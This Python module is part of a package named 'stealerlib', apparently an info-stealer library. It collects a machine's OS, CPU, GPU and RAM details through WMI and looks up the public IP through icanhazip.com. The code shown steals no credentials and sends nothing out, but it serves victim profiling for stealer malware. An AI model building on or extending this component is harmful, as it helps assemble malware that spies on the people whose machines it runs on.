#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/system/__init__.py
"""

import os
import wmi
import math
import psutil
import platform
import requests

from typing import Union

from stealerlib.exceptions import catch

from stealerlib.system.cpu import CPU
from stealerlib.system.mem import Memory
from stealerlib.system.types import SystemTypes
from stealerlib.system.decorators import *


class System(CPU, Memory):
    """This class provides methods for extracting and interacting with system related information -
       for multiple different operating systems by utilizing psutil and other related package

    Supported Platforms (from psutil PyPI page):
        Linux
        Windows
        macOS
        FreeBSD, OpenBSD, NetBSD
        Sun Solaris
        AIX
    """

    def __init__(self):
        CPU.__init__(self)
        Memory.__init__(self)

        self.platform = platform.system()
        self.__load__()

    @staticmethod
    def convert_size(size: bytes) -> str:
        if size == 0:
            return "0B"

        size_name = ("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
        i = int(math.floor( math.log(size, 1024)))
        p = math.pow(1024, i)
        s = round(size / p, 2)

        return "%s %s" % (s, size_name[i])

    def __load__(self):
        system = wmi.WMI()
        self.comp_info = system.Win32_ComputerSystem()[0]
        self.os_info = osi = system.Win32_OperatingSystem()[0]
        self.proc_info = system.Win32_Processor()[0]
        self.gpu_info = system.Win32_VideoController()[0]

        self.os_name = osi.Name.encode('utf-8').split(b'|')[0]
        self.os_build = osi.BuildNumber
        self.os_version = osi.Version
        self.ram = self.convert_size(float(osi.TotalVisibleMemorySize))

    def get_ip(self) -> str:
        ip = requests.get("https://icanhazip.com/").text

        return ip.splitlines()[0]